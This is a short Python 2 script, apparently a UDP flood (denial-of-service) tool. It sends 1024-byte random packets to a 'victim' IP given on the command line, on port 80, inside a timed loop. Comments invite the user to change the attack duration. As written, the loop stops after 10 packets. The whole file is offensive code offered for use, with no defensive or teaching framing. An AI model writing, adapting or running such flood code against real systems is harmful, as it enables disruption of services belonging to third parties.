import socket 
import random
import time
import sys

try:
    var = sys.argv[1]
except IndexError:
    var = "somevalue"

print var

#create socket, packet
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
packet_size = random._urandom(1024) 
victim_ip = var
attack_port = 80 

sent = 0 
standard_time = time.time()
print 'success'
standard_time = time.time()

#attacks victim with packets until program is exitted
while(sent<10): 
	end = time.time()
	#change if statement to wanted duration of attack 
	if(end - standard_time < 60):
		sock.sendto(packet_size, (victim_ip, attack_port))
		sent = sent + 1
	else:
		exit()